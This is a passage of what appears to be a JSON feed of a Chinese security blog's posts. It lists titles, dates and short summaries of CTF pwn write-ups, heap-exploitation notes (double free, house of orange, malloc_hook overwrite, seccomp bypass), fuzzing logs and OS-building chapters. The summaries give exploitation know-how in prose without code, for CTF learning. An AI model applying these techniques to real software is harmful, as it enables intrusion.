+      "summary": "看了一段时间，暂时还没有找出洞，自己还是太菜了，考虑到题目的逻辑较复杂，结构体也较多，在这里先记录一下，免得到时候忘了。 程序总共有 7 个功能，在 main 函数中使用一个 switch 来跳转，简单重命名一下如下"
+    },
+    {
+      "title": "《操作系统真像还原》操作系统实现——用户进程",
+      "url": "https://chujdk.github.io/os/1374.html",
+      "date": "2021-06-09",
+      "summary": "硬件生产厂商（Intel）给多进程切换提供了硬件级的解决方案，也就是使用 TSS （ Task-Stat Segment ），令人遗憾的是由于其效率较低，现代操作系统大多没有使用它来进行进程切换，但是特别的，在特权级转移时的栈切换仍然需要通过它来进行，所以虽然我们不用它来切换进程，也仍然需要设置好它。"
+    },
+    {
+      "title": "《操作系统真像还原》操作系统实现——从键盘获取输入和缓冲区",
+      "url": "https://chujdk.github.io/os/1371.html",
+      "date": "2021-06-06",
+      "summary": "关于键盘输入我不想写，就是一个和硬件交互的过程，这里主要还是说一下输入输出缓冲区。 代码已经打好 tag， 链接 ，比较重要的就是 ioqueue。 获取键盘输入后，可以直接打出到屏幕上，但是这样除了给用户看看之外没有任何的用处，如果想要让输入有效，就必然需要把输入暂存到一个地方，然后让需要从用户读取的线程读取输入，这就需要一个缓冲区来处理这个问题， Dijkstra 提出了一个生产者-消费者模型，基于该模型的思想可以有效地解决这个问题。"
+    },
+    {
+      "title": "pwn 指定程序运行时使用的 libc",
+      "url": "https://chujdk.github.io/pwnreview/941.html",
+      "date": "2021-06-04",
+      "summary": "文章是一月份的时候写的了，那个时候比较稚嫩，当时并没有很好的解决这个问题，也没有写清楚，现在重写一下。 使用 patchelf 替换 假如我们有靶机的 libc，那么通过 patchelf 就可以将二进制使用的 libc 硬改写成靶机的 libc。"
+    },
+    {
+      "title": "《操作系统真像还原》操作系统实现——线程和锁",
+      "url": "https://chujdk.github.io/os/1359.html",
+      "date": "2021-06-03",
+      "summary": "这篇文章写的比较乱且简略，要看的话建议跟着代码一起看。本文代码在 此处 线程和进程是操作系统的重要概念。 线程和进程的区别 这似乎是一个面试中常见的问题了哈哈哈，这里我可能无法给出教科书级别的解释（实际上那也未必是最好的解释），只写一下自己的理解。"
+    },
+    {
+      "title": "XCTF-FINAL 2021-house of pig-WP",
+      "url": "https://chujdk.github.io/wp/1362.html",
+      "date": "2021-06-01",
+      "summary": "感觉自己还是太菜了，在比赛期间甚至都没有逆清楚这道题，即使学长给了分析好的 idb 文件也看不懂。当然当时身体不是很好也有一部分原因，但是还是觉得很遗憾。比赛结束后复现了一下，也算是学习一下新的利用方法。"
+    },
+    {
+      "title": "DASCTF2021.5-PWN-WP",
+      "url": "https://chujdk.github.io/wp/1360.html",
+      "date": "2021-05-30",
+      "summary": "由于有 XCTF-FINAL，所以虽然报了名，但是并没有打这场比赛，XCTF 也是零贡献，什么都不会了只好补一下 DASCTF 的题目，两题都很简单。 ticket 可以通过申请释放再申请可以 leak 出 libc 和堆的基址，然后输入在 age 变量处伪造一个 chunk 的地址，利用整数溢出 free 掉这个 chunk，实现 double free，打 malloc_hook 即可"
+    },
+    {
+      "title": "bluehat2021-portable-WP",
+      "url": "https://chujdk.github.io/wp/1357.html",
+      "date": "2021-05-27",
+      "summary": "很久之前打的比赛了，由于调试环境没配好，一直没复现这道题，前天突发奇想 手动编译了一下 qemu 发现可以调了，所以就复现了一下 主要的洞在 这里的 switch 中，没有对 v1 进行范围检查，所以输入零就可以不更新 player 信息，实现 double free 和 leak。"
+    },
+    {
+      "title": "PWN ARM 环境配置",
+      "url": "https://chujdk.github.io/pwnreview/1353.html",
+      "date": "2021-05-25",
+      "summary": "主要使用的调试方法为：qemu + gdb-multiarch，再交叉编译得到有符号的 libc。 qemu 安装 直接通过 apt 安装并不是一个很好的选择，因为版本往往不是最新的，而且对调试的支持并不是很好（内存分析的比较一般），我选择通过手动编译安装来安装。"
+    },
+    {
+      "title": "《操作系统真像还原》操作系统实现——内存池管理",
+      "url": "https://chujdk.github.io/os/1349.html",
+      "date": "2021-05-25",
+      "summary": "操作系统需要管理内存页的映射，即虚拟地址和物理地址的映射关系，一种简单的方法是一对一映射，管理起来也比较方便，申请的时候填写页表，释放的时候清空页表就可以了，但是这样就背离了我们引入虚拟地址的初衷。而若想使用乱序映射的映射方法，我们需要用某种数据结构来管理物理内存的使用情况。"
+    },
+    {
+      "title": "ptmalloc 的简单分析",
+      "url": "https://chujdk.github.io/pwnreview/1300.html",
+      "date": "2021-05-23",
+      "summary": "前言 断断续续写了一个多月，终于写完了。写本文的主要目的是获得一个对堆的理性认知，从知其然到知其所以然。主要分析了 __libc_malloc，_int_malloc，__libc_free，_int_free，malloc_consolidate 五个比较长且核心的函数。基本覆盖了较小（即未大到需要进行 sys_malloc）的情况。当然对于较大的请求的处理也是有必要学习的，之后应该会再写一篇。总的来说本文写的比较简略，且略过了对 malloc_chunk 结构体、unlink 函数的介绍，您在看之前应该需要对 ptmalloc 的流程和基础结构已有一定了解。"
+    },
+    {
+      "title": "《操作系统真像还原》操作系统实现——中断",
+      "url": "https://chujdk.github.io/os/1339.html",
+      "date": "2021-05-23",
+      "summary": "中断这个东西说起来不是很难，实现起来比较麻烦，主要是和硬件有一定联系，会略显复杂。 宏观视角 宏观地来看，一个中断的过程就是 CPU 接受中断信号，然后执行对应的处理函数。这里的中断分外部中断和内部中断两种。"
+    },
+    {
+      "title": "IDA switch 在跳表结构下的修复",
+      "url": "https://chujdk.github.io/mess/1345.html",
+      "date": "2021-05-22",
+      "summary": "今天协会打了一场内部 AWD，第一次参加这样的比赛，确实有不少手忙脚乱的地方，也有学到许多新知识。 PWN 总共有两题，其中一题虚拟机类题由于有较大的 switch 结构，而 gcc 在编译超过 5 个 case 的 switch 时就会用跳表来优化，F5 之后一般会变成下面这个样子"
+    },
+    {
+      "title": "《操作系统真像还原》操作系统实现——内核中的字符打印函数",
+      "url": "https://chujdk.github.io/os/1336.html",
+      "date": "2021-05-20",
+      "summary": "昨天在看特权级相关的东西，看的云里雾里，没搞得很懂，考虑到短期之内不会弄得特别深，而且我们也用不上调用门，相关的较复杂的问题也应该不会碰到，所以准备暂时跳过。"
+    },
+    {
+      "title": "Windows 下用户名为中文造成 pip 无法使用——IDA keypatch 安装引出的问题",
+      "url": "https://chujdk.github.io/mess/1334.html",
+      "date": "2021-05-19",
+      "summary": "这么简单的一个事情花了我半个多小时，想想还是有必要记录一下。 为了之后可能要参与的线下 AWD，准备给我的 IDA 安装一波 keypatch。这个插件依赖 keystone 和 six（我这里报了缺这俩的错，可能还有依赖别的），如果是 Linux 下，安装很容易"
+    },
+    {
+      "title": "CISCN2021-silverwolf-WP",
+      "url": "https://chujdk.github.io/wp/1333.html",
+      "date": "2021-05-19",
+      "summary": "这次 CISCN 可以说是没参赛，只做了分数最低的 pwny，最后 realloc 调 one_gadget 栈的工作也不是我做的（一方面嫌烦另一方面刚准备调学长已经把 exp 写好了）。那题其实就是个脑洞题，没什么难度。channel 还没看，大概就是一个 UAF 和 arm 加 qemu-user 运行免去 leak 的题，之后看心情复现一下吧（arm 的调试仍然不是很会，还需要多学习）。"
+    },
+    {
+      "title": "《操作系统真像还原》操作系统实现——引导内核",
+      "url": "https://chujdk.github.io/os/1330.html",
+      "date": "2021-05-18",
+      "summary": "到现在为止，我们已经进入了保护模式并做好了虚拟地址映射、开启了分页模式，loader 的历史使命也差不多该完成了，现在它需要来引导我们的内核并移交控制权了。"
+    },
+    {
+      "title": "《操作系统真像还原》操作系统实现——进入分页模式",
+      "url": "https://chujdk.github.io/os/1327.html",
+      "date": "2021-05-17",
+      "summary": "进入保护模式后，我们对内存的访问仍然是基于物理地址的，我们运行的程序，大多是希望自己有一段连续的地址空间的，这样方便寻址。如果使用物理地址来访问内存，就必须真的给每个进程都分配大段地连续物理内存空间，这可能造成内存碎片难以处理的问题。为了解决这个问题，可以引入 分页模式 （ Paging mode ），好处非常多，此处不再赘述，可以看 WIKI 。"
+    },
+    {
+      "title": "《操作系统真像还原》操作系统实现——进入保护模式",
+      "url": "https://chujdk.github.io/os/1323.html",
+      "date": "2021-05-15",
+      "summary": "之前看完王爽老师的《汇编语言》后本来准备看一下《X86汇编语言：从实模式到保护模式》，但是那本书不是很好读，再加上自己也选择的是 PWN 这个方向，对汇编的要求没有那么高，所以就没读下去，对保护模式也只有一点粗浅的认知。本书看完了 4.3 节，虽然也不敢说有多深的理解，但是还是有学到新知识的，这里简单记录一下。"
+    },
+    {
+      "title": "《操作系统真像还原》操作系统实现——MBR",
+      "url": "https://chujdk.github.io/os/1320.html",
+      "date": "2021-05-14",
+      "summary": "最近这段时间准备学一学 OS，《现代操作系统》一书尝试了很多次都没看进去，还是先找一本轻松一点的书来看，尝试一下能不能跟着这本书写一个简单的 OS 出来。"
+    },
+    {
+      "title": "XCTF 津门杯 2021-PwnCTFM-WP",
+      "url": "https://chujdk.github.io/wp/1317.html",
+      "date": "2021-05-11",
+      "summary": "比赛的时候不知道为什么，一直没想出来，赛后复现一下。 本题、本次比赛，最讨厌的地方就是每道 PWN 题都没给 libc，大幅降低了做题体验（好吧还是我太菜了）。其实题目很简单。"
+    },
+    {
+      "title": "4 月总结",
+      "url": "https://chujdk.github.io/mess/1314.html",
+      "date": "2021-05-09",
+      "summary": "博客近期的更新频率大幅下降了，主要是做不出什么题目，没有 WP 可发，之后应该也只能维持这个更新频率。 4 月份只做了十几道题，给 CTF-WIKI 做了两次 PR，也都成功 MERGE 了。总的来说学的东西不是很多，但也不算很少，大体上了解了一下新版本 libc 加入的一些保护机制，复现了一下相关的题目。同时总结了一下 libc-2.29 之后的 off-by-one 利用，并且贡献到了 WIKI 上。同时还做了两道虚拟机类的题目，了解了基本的解题思路。"
+    },
+    {
+      "title": "AFL学习记录（四）——使用 LAVA-M/BASE64 测试集进行表现测试",
+      "url": "https://chujdk.github.io/fuzzing/1312.html",
+      "date": "2021-05-06",
+      "summary": "这个测试本来我应该在一个月前完成，但是由于各种各样的原因拖到了现在哈哈哈。 之前一直因为无法完成插桩编译，所以只能用 qemu 模式来整，这个模式就会慢很多了，我用了 6 个线程跑了两个多小时什么都没跑出来，遂放弃。今天灵光一闪，自己手动编译了一下，不知道为什么就完成了插桩编译。然后也发现了之前跑不出结果的原因——没加 -d 参数（哈哈哈也是很呆了）。这里简单记录一下测试过程。"
+    },
+    {
+      "title": "pwn arm 环境——重型解决方案",
+      "url": "https://chujdk.github.io/pwnreview/1303.html",
+      "date": "2021-05-01",
+      "summary": "写在一个月后：这个用法，说实话没什么用，建议不要这么想，光是虚拟机起一下要近十分钟就已经让人无法接受了，而且有各种各样鸡皮的问题，建议通过手动编译 qemu 来获得更好的调试体验。可以参考 此文"
+    },
+    {
+      "title": "Bluehat2021-slient-WP",
+      "url": "https://chujdk.github.io/wp/1302.html",
+      "date": "2021-04-29",
+      "summary": "这题没啥意思，就是爆破。由于无法输出任何东西，需要有能代表是正确的标志，可以使用 jmp 0 的方法，如果爆破正确则 jmp 0，否则 jmp 到一个乱七八糟的地方造成段错误，这样通过是否有 got eof 就可以判断了。"
+    },
+    {
+      "title": "PWNABLE.TW-BREAK OUT-WP",
+      "url": "https://chujdk.github.io/wp/1301.html",
+      "date": "2021-04-27",
+      "summary": "这道题还是比较刺激的，一开始觉得很简单，直接改 note 指针修改 __free_hook 就行了，结果发现开启了写地址白名单，只允许在堆段上写数据，于是考虑 unsorted bin attack 改白名单，然后无语地发现白名单只读，于是只能 FSOP，然后本机和服务器的堆环境还不一样（明明是一样的 libc），打出了整个堆段分析才找到正确的地址。"
+    },
+    {
+      "title": "XCTF-sentosa-WP",
+      "url": "https://chujdk.github.io/wp/1298.html",
+      "date": "2021-04-24",
+      "summary": "主要的漏洞点在 这里，当 Input length of your project name: 时输入 0，此处 v2 就会变成 -1，可以栈溢出。 栈环境如下 由于有 canary，有意义的溢出也仅有溢出到 v6。 v6 仅在最后被存入到了指针数组中，又没有 edit 功能，所以我们只能通过部分覆写来实现 leak 和 free。"
+    },
+    {
+      "title": "pwn 白名单绕过总结",
+      "url": "https://chujdk.github.io/pwnreview/1294.html",
+      "date": "2021-04-22",
+      "summary": "有些时候 pwn 题目中为了增加难度（实际是为了恶心选手），会使用类似 seccomp 的函数来禁用一部分系统调用，往往会把 execve 这种系统调用禁用掉，基本上拿 shell 是不可能了，但是我们 pwn 题是面向 flag 的，所以还是可以通过 orw（ open-read-write ）的方法来读出 flag 的。在栈上的 orw 和 普通 rop 其实没有什么特别大的区别，这里主要谈一谈堆利用中的白名单绕过。"
+    },
+    {
+      "title": "Balsn_CTF_2019-PlainText-WP",
+      "url": "https://chujdk.github.io/wp/1290.html",
+      "date": "2021-04-22",
+      "summary": "这道题确实是比较难，卡了很多天，又花了很久才复现出来。 漏洞点分析 程序的流程比较清晰简单，在 add 函数中，存在明显的 off-by-null。 而 free 中对被 free 的指针进行了置空，导致无法直接 show，而程序对我们的输入末尾附加 \\x00 ，也无法使用释放再申请的方法，leak 比较困难。"
+    },
+    {
+      "title": "PlaidCTF2021-Plaidflix-WP",
+      "url": "https://chujdk.github.io/wp/1289.html",
+      "date": "2021-04-19",
+      "summary": "周末两天都在打这个比赛，毕竟是高质量的国际赛，难度确实是有点大，我也只做出了这道比较传统并且简单的题目。 首先是程序的逆向，不知道对 binary 做了什么处理，反正用 IDA 分析乱的一塌糊涂，但是和动调结合还是可以理解清楚程序的功能的。总体来讲在 manage movie 和 manage friend 中仅有一个 share movie with friend 这个功能存在有限的 UAF，也就是通过先分享电影给朋友，然后删掉朋友，仍然是可以输出朋友的信息的，通过这样的方法可以 leak 出堆地址和 libc 地址。比较坑爹的是，在靶机使用的 libc 下，main_arena + 0x60 的偏移的最低一字节正好是 \\x00，无法输出。但是由于可以申请大小为 \\x90 的 chunk，所以可以通过把 unsorted bin 压入 small bin 的方法来 leak。"
+    },
+    {
+      "title": "BUU-[OGeek2019 Final]OVM-WP",
+      "url": "https://chujdk.github.io/wp/1287.html",
+      "date": "2021-04-15",
+      "summary": "做的第二道虚拟机类题，此题还算比较简单，因为程序结构很清晰，也贴心的给出了调试信息，可以比较容易读懂程序。读懂程序之后找到漏洞点，利用就比较简单了。"
+    },
+    {
+      "title": "BUU-ciscn_2019_qual_virtual-WP",
+      "url": "https://chujdk.github.io/wp/1270.html",
+      "date": "2021-04-14",
+      "summary": "一道虚拟机 pwn 题，大概是最入门的级别的了，也是此类题型我做的第一道，感觉主要的难点在逆向而非利用，理解程序行为和发现漏洞点后就不难做出了。 逆向分析 此程序模拟了一个数据段，一个代码段和一个栈段"
+    },
+    {
+      "title": "hitcon_ctf_2019_lazyhouse-WP",
+      "url": "https://chujdk.github.io/wp/1269.html",
+      "date": "2021-04-13",
+      "summary": "hitcon 的题目还是非常有质量且紧跟时代潮流的，在 2019 年连出两道和 libc 2.29 相关的堆利用题，一题是 one_punch ， 我的 WP ，另一题就是就是本题，我并未在网络上找到环境，题目的二进制文件和 libc 可以在 这里 下载。Angel Boy 的题目自然质量有保证，我做了半天多才整出来。我使用的方法是所谓的 Tcache stash unlink attack+ ，在网络上并没有找到详细的同方法 WP，所以我这一篇就写的详细一些。"
+    },
+    {
+      "title": "PWNABLE.TW-Printable-WP",
+      "url": "https://chujdk.github.io/wp/1265.html",
+      "date": "2021-04-12",
+      "summary": "相当麻烦的格式化字符串和 .fini 数组利用结合的题目，由于是 pwnable 的题，这里只简单记录一下思路 首先，printf 是很裸的，但是执行完后就会直接 exit，这肯定不行，首要的是要做到能够重复利用。exit 在执行时，会遍历 .fini 数组中的所有函数并执行。程序没有开启 PIE，自然会想到修改 .fini 数组，但是该数组不可写，就需要用别的方法。在调用 .fini 数组中的函数的 _dl_fini 中有这样一段代码"
+    },
+    {
+      "title": "_IO_FILE 相关源码阅读（一）——vtable 及其指向的函数:从 __finish 说起",
+      "url": "https://chujdk.github.io/pwnreview/1171.html",
+      "date": "2021-04-10",
+      "summary": "__finish 虚函数主要处理的是对文件结构体的析构操作，同时会根据情况进行对文件进行 close 操作。通过本文的分析，应该可以基本理解 _IO_new_file_finish 、 _IO_new_file_write 、 __GI__IO_file_seek 、 __GI__IO_file_close 等函数的实现。同时可以对面向语言中 虚函数 的实现有初步的了解，更重要的，可以明白面向对象是一种思维，而不是语法，使用面向过程式语言仍然可以实现面向对象的开发。"
+    },
+    {
+      "title": "PWNABLE.TW-seethefile-WP",
+      "url": "https://chujdk.github.io/wp/1253.html",
+      "date": "2021-04-06",
+      "summary": "首先是前置的小 trick： 关于/proc目录 题目提供了读取文件的功能，可以读除了 flag 之外的文件。自然可以想到通过 /proc/self/maps 来 leak 出 libc 的基地址。 然后在退出时 注意到这里有一个 \"%s\" 可以溢出。一开始也没仔细看，以为 name 是栈上的变量，也没看到后面的 exit(0) ，准备 rop，结果发现 name 在 .bss 段上，难以 rop，但是注意到 fp 变量在 name 后面，所以可以通过溢出覆写 fp。程序没有开启 PIE，所以我们写入的地址是已知的，我们布置好一个 fake_file，让 fp 指向它，在执行 fclose 的时候 getshell 了。"
+    },
+    {
+      "title": "unsorted bin 利用的简单总结",
+      "url": "https://chujdk.github.io/pwnreview/1216.html",
+      "date": "2021-04-05",
+      "summary": "学习堆利用也有一段时间了，基本上就是在和 fastbin 和 unsorted bin 打交道，最近这段时间 tcache 的题也做了一些。套路居多，想想还是应该总结一下。不会写的太详细，也可能无法写全。"
+    },
+    {
+      "title": "PWNABLE.TW-Secret Garden-WP",
+      "url": "https://chujdk.github.io/wp/1250.html",
+      "date": "2021-04-04",
+      "summary": "这道题其实很简单，就是 unsorted bin 的 leak 加上一个 house of spirit，我 pwn 它可能主要还是为了减轻不做题的罪恶感。 visit 这个功能可以输出，我们只要释放一个 unsorted bin，再申请一个大小为 0 的堆块就可以 leak 出 main_arena，从而算出 libc 基址（关于 unsorted bin 的 leak 原理可见我的 这篇文章 ）。"
+    },
+    {
+      "title": "虎符网络安全赛道参赛有感",
+      "url": "https://chujdk.github.io/pwnreview/1246.html",
+      "date": "2021-04-03",
+      "summary": "今天去协会打了 8 个小时的比赛，这也是我第一次跟队参加比赛，还是非常激动的 当然其实与其说是打比赛，不如说是被比赛打。整场比赛就只看了一道 pwn 题，此题也非常没品地换了个架构，是在 aarch64 架构下的。我大概花了一个多小时的时间配置环境，最后还是在语神和薯片二位学长的帮助下才成功把程序跑起来的。"
+    },
+    {
+      "title": "PWNABLE.TW-secret_of_my_heart-WP",
+      "url": "https://chujdk.github.io/wp/1241.html",
+      "date": "2021-04-01",
+      "summary": "一道堆题，主要的漏洞点是 off-by-one。 可见这里会在读入的字符串末尾加零，那么只要我们申请形如 0x18 的大小的空间，写入 0x18 个字符，就可以溢出一个字节，将下一个 chunk 的 size 域的 prev_inuse 位置零，然后把下一个 chunk free 掉，两个 chunk就可以合并。"
+    },
+    {
+      "title": "3月总结",
+      "url": "https://chujdk.github.io/mess/1236.html",
+      "date": "2021-03-31",
+      "summary": "三月的最后一天，复盘一下三月份。 这是开学的第一个月，大一下了，对大学也有了更多的了解，但是似乎在活动方面，还是毫无接触，一方面是没什么活动能够吸引到我，另一方面也是时间不太够。想想还是有些遗憾，没在大学认识多少人，也没让多少人认识我，社交圈都是同班同学，比较孤独，客观来说这并不符合我的性格。但是也不多考虑了，先提升自己的技术再说吧。"
+    },
+    {
+      "title": "PWNABLE.TW-unexploitable-WP",
+      "url": "https://chujdk.github.io/wp/1232.html",
+      "date": "2021-03-31",
+      "summary": "此题是一个 rop，分数挺高，难度不大。 The original challenge is on pwnable.kr and it is solvable. This time we fix the vulnerability and now we promise that the service is unexploitable. 题目描述是这样的， pwnable.kr 没刷过，也不知道原题是什么，反正先 IDA 里面看一下再说"
+    },
+    {
+      "title": "PWNABLE.TW-De-ASLR-WP",
+      "url": "https://chujdk.github.io/wp/1227.html",
+      "date": "2021-03-30",
+      "summary": "这个 ROP 非常的麻烦 分析 流程就两句话 看起来似乎非常的简单，就是一个 gets 造成的无限溢出。但是并没有任何输出函数，所以 leak 非常困难。 思路 没有任何的 libc 地址，想要 leak 只能用栈上的残留数据，程序没有开启 PIE，所以我们可以通过栈迁移将栈迁移至地址固定的段上，比如进程末尾的可读可写页。然后在此处执行一个 gets，就可以把一些 libc 的地址留在这里了。"
+    },
+    {
+      "title": "BUU-hitcon_ctf_2019_one_punch-WP",
+      "url": "https://chujdk.github.io/wp/1226.html",
+      "date": "2021-03-28",
+      "summary": "许久没做题了，今天花了半天的时间学习了一下 Tcache stash unlink attack 这种利用方式，做了一下 hitcon 的这道题。 其实第一次碰到这道题是在 hctf-game final 的时候，语神给这道题套了一个 php 的壳当成 webpwn 出了出来，当时由于不知道该怎么 leak（由于外面套了一层 php，内部堆的结构非常混乱而且易变）就没有做出来。一直没有复现，解一下这题也就当复现了吧。"
+    },
+    {
+      "title": "XCTF-shaxian-WP",
+      "url": "https://chujdk.github.io/wp/1221.html",
+      "date": "2021-03-26",
+      "summary": "这道题做出的人很少，本来以为很难，结果一点都不难，但是打不通远程，不出意外应该是靶机的问题。因为本机可以打通，但是远程打不通，为了证明特意去网上找了一些 wp 中的 exp，发现也打不通，主要是因为找不到正确版本的 libc，第二次碰到这种情况，XCTF 平台还是有点不厚道啊。"
+    },
+    {
+      "title": "PWNABLE.TW-BookWriter-WP",
+      "url": "https://chujdk.github.io/wp/1217.html",
+      "date": "2021-03-24",
+      "summary": "这是一道 house of orange，总体比较明显，比较模板化，但是有一处溢出点藏得比较深。 漏洞点 这里对 size_arr 进行了更新，使用的是 strlen ，那么只要我们把输入的字符串和下一个 chunk 的 size 接起来，就可以扩大 size，这样就可以在下一次 edit 时修改下一个 chunk 的 size。"
+    },
+    {
+      "title": "PWNABLE.TW-Heap Paradise-WP",
+      "url": "https://chujdk.github.io/wp/1214.html",
+      "date": "2021-03-23",
+      "summary": "第二次碰到这题，上次无思路放弃了，这次觉得不能放弃了，就学习了一下，也算是开拓一下利用的思路吧。 又是如此，只有分配和回收，保护全开。和昨天做的 Re-alloc Revenge 很像，不过此题 libc 版本为 2.23，难度陡增。"
+    },
+    {
+      "title": "PWNABLE.TW-Re-alloc Revenge-WP",
+      "url": "https://chujdk.github.io/wp/1210.html",
+      "date": "2021-03-21",
+      "summary": "前段时间做了一道 利用 realloc 的题 ，感觉很有意思。看到此题的名字就有了兴趣，于是花了一天解了一下。 关于 realloc 的特性和攻击 _IO_FILE ，本文不再赘述，可见此 WP TWCTF_online_2019_asterisk_alloc"
+    },
+    {
+      "title": "PWNABLE.TW-Spirited Away-WP",
+      "url": "https://chujdk.github.io/wp/1208.html",
+      "date": "2021-03-20",
+      "summary": "比较简单的栈溢出加堆溢出。 此处在 cnt >= 100 时有单字节溢出，会把 nbytes 溢出成 n 然后通过此处 修改 buf，使之指向栈上一段可控空间 比如这一段，我们可以轻易地布置 fake chunk"
+    },
+    {
+      "title": "PWNABLE.TW-death_note-WP",
+      "url": "https://chujdk.github.io/wp/1204.html",
+      "date": "2021-03-20",
+      "summary": "漏洞在于数组访问越界和堆栈可执行。在 add_note 函数中输入负数可以修改 got 表，使之指向一段我们可写的地址。自然地可以想到布置 shellcode getshell。然而本题对输入的 shellcode 进行了检查，每个字符都需要是可输出字符，这种题之前做过两道，都是使用工具自动生成的。因为我一直觉得 shellcode 这种东西挺没意思的，就一直没有深究到底该怎么写它，一直都是用工具生成，这道题就吃瘪了，把 shellcode 长度限制在了 80 中，现成的 shellcode 都无法使用。于是只能自己写"
+    },
+    {
+      "title": "BUU-TWCTF_online_2019_asterisk_alloc-WP",
+      "url": "https://chujdk.github.io/wp/1203.html",
+      "date": "2021-03-19",
+      "summary": "这道题涉及到 realloc 的利用，还蛮新奇的，第一次接触。昨天晚上卡了一晚上没做出来，今天终于是解完了。 首先 realloc 在申请的空间不同时，行为也是不同的。我们记申请的大小为 Nsize，ptr 指向的堆块的大小为 Osize，那么在调用 realloc(ptr,Nsize) 时有以下几种情况"
+    },
+    {
+      "title": "AFL学习记录（三）——qemu 模式的测试",
+      "url": "https://chujdk.github.io/fuzzing/1201.html",
+      "date": "2021-03-18",
+      "summary": "今天尝试了一下使用 AFL-qemu 的黑盒测试，这里简单记录一下。 首先需要安装，在目录下的 qemu-mode 文件夹中有构建脚本 build_qemu_support.sh ，运行之即可安装。期间可能会出现缺少依赖的情况，缺什么安装什么即可。如果缺乏 libtool，使用 sudo apt install libtool 后仍然可能提示缺少，这是再执行 sudo apt install libtool-bin 即可。"
+    },
+    {
+      "title": "BUU-rootersctf_2019_heaaaappppp-WP",
+      "url": "https://chujdk.github.io/wp/1195.html",
+      "date": "2021-03-17",
+      "summary": "此题的起名吸引了我去做它。题目不难，不过之前从来没有做过 Tcache dup 类的利用，也算是学习了新知识（考虑到这和 fastbin double free 相比除了简单不少之外没有什么区别，其实还是只做了一道水题）。题目有给我一定的困扰，也有考虑放弃去找 WP，但是没找到，就只能自己做了，结果做了出来。这个故事我觉得以后做题还是要更加坚持。"
+    },
+    {
+      "title": "BUU-sleepyHolder_hitcon_2016-WP",
+      "url": "https://chujdk.github.io/wp/1192.html",
+      "date": "2021-03-16",
+      "summary": "不得不说 hitcon 2016 那场比赛的堆题是真的都很牛叉，让我学到了很多东西。这道题和同场比赛中的 secret_holder 有在总体流程上几乎一样，但是利用方式不同。 这个程序除了 double free 之外是没有漏洞的，如何利用这个 double free 呢？之前那道 secret_holder 是通过类似 chunk overlapping 的方法实现 UAF 然后 unlink 的，但是本题的 huge chunk 只能申请一次，然后就完全无法操作了。那么如何实现类似的 UAF 呢？方法比较巧妙，我也很遗憾自己没有想出来。利用的是 malloc_consolidate 函数，我们知道 ptmalloc 在处理 big request 的时候，遍历到 large bin 的时候，会先调用 malloc_consolidate 函数整理碎片，这个时候会把 fastbin 中所有的 bin 先尝试合并，然后放到其对应的 bin 中。而本题可以申请一次 huge chunk，就有了触发 malloc_consolidate 的机会。我们的解法就是申请一个 small secret，再申请一个 big secret，两个 chunk 分别记作 A，B，先 free 掉 A，然后申请 huge secret，在 malloc_consolidate 后，A，本来属于 fastbin，就被收入了 smallbin，其下一个 chunk，也就是 B 的 prev_inuse 位被置为零。"
+    },
+    {
+      "title": "HgameFINAL-nohook-WP",
+      "url": "https://chujdk.github.io/wp/1183.html",
+      "date": "2021-03-13",
+      "summary": "Final 就做出这一道，第二道 webpwn 确实不太会，花了很长时间才搞出环境，最后无时间了。语神和我说出这个题也没想让我们做出来，感到一丝恶意和一丝释然。Hgame 到这里也正式结束了，总结就不写了。"
+    },
+    {
+      "title": "XCTF-house_of_grey-WP",
+      "url": "https://chujdk.github.io/wp/1176.html",
+      "date": "2021-03-11",
+      "summary": "看到题目还以为是堆利用，但是实际上是文件系统中的一个小 trick。 前置的是 /proc 目录的知识，可以看 这篇文章 这个知识在 hgame 中第一次碰到，可看 这篇 WP 中的 the_shop_of_cosmos 漏洞点 任意地址写 这里的 buf 可以把 v8 溢出掉，结合"
+    },
+    {
+      "title": "HITCON-House of Orange-WP",
+      "url": "https://chujdk.github.io/wp/1167.html",
+      "date": "2021-03-09",
+      "summary": "House of Orange 是很有名的一种利用方法，早有耳闻，这次准备研究一下。 quick FAQ Q：为什么我日不穿 XCTF-adword 的靶机！ A：XCTF 提供的 libc 是错的 解决方案：用 LibcSearcher。 这个问题浪费了我 2-3 个小时:(。至于我是如何发现 libc 是错的，我会在文末提及。"
+    },
+    {
+      "title": "XCTF-magic-WP",
+      "url": "https://chujdk.github.io/wp/1165.html",
+      "date": "2021-03-07",
+      "summary": "这篇 WP 没有写完！！！ 我还没有完成这篇 WP，因为有太多的源码没有研究，建议您看 这一篇 写在前面 这道题是一个 _IO_FILE 利用，大概是我做过的最难的一道题，基本是看着 wp 才做出来的。同时 _IO_FILE 利用和源码的联系非常紧密，之后我会仔细研究一下源码，现在这篇 wp 还是非常的不成熟，许多地方我没有详细解释。"
+    },
+    {
+      "title": "XCTF/BUU-secret_holder-WP",
+      "url": "https://chujdk.github.io/wp/1161.html",
+      "date": "2021-03-06",
+      "summary": "XCTF 提供了莫名其妙的附件，不能解压。所以只好自己找 binary。 下载链接 前置知识 这道题出现了 mmap 的情况，这是我之前不曾碰到过的。 红框中申请了一个巨大的空间，引用华庭《glibc内存管理ptmalloc源代码分析》中的分析"
+    },
+    {
+      "title": "XCTF-RCalc-WP",
+      "url": "https://chujdk.github.io/wp/1157.html",
+      "date": "2021-03-06",
+      "summary": "这是一个挺有意思的栈溢出题，很久没做过栈溢出了，居然看了很久才发现漏洞点是栈溢出.. 这里很明显有栈溢出，然后下面的 result = sub_400B92(); if ( result != v2 ) sub_400BD4(); 感觉像是 canary，但是 checksec 一下发现并没有开启 canary"
+    },
+    {
+      "title": "XCTF/BUU-4th-QCTF-2018-babyheap-WP",
+      "url": "https://chujdk.github.io/wp/1144.html",
+      "date": "2021-03-05",
+      "summary": "3.04 这道题题目给的 libc 是 32 位的，但是程序本身是 64 位的..更令人崩溃的是查不出题目用的 libc，所以我基本是打不穿远程了，但是题目本身还是可以做一下，今天 leak 出了 libc_base，但是比较晚了，明天还有早八，所以先不搞了。"
+    },
+    {
+      "title": "AFL学习记录（二）——一次简单的测试",
+      "url": "https://chujdk.github.io/fuzzing/1140.html",
+      "date": "2021-03-04",
